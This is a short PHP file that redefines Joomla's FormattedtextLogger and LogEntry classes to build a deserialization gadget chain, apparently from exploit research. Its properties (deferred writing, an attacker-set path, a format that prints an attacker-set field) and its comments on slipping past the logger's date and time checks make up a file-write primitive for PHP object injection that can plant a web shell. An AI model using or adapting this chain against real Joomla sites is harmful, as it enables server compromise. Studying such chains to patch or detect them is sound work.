<?php

namespace Joomla\CMS\Log\Logger
{
    class FormattedtextLogger
    {
        protected $defer = true;
        protected $options = ['text_file_no_php' => true];
        protected $path;
        protected $deferredEntries = [];
        protected $format = '{F}';
        protected $fields = ['F'];

        public function __construct($path, $deferredEntries)
        {
            $this->path = $path;
            $this->deferredEntries = [$deferredEntries];
        }
    }
}

namespace Joomla\CMS\Log {
    class LogEntry
    {
        // Setting $clientIP avoids \Joomla\Utilities\IpHelper::getIp running
        // but the Gadget Chain seems to work okay either way.
        // public $clientIP = 'i';   // !isset($entry->clientIP)

        public $date = '1234567890'; // strlen($entry->date) != 10
        public $time = 't';          // !isset($entry->time)

        // This property could be called anything but must match the values of
        // the $format and $fields properties of the FormattedtextLogger.
        public $f;                   // #[\AllowDynamicProperties]

        function __construct($f) {
            $this->f = $f;
        }
    }
}
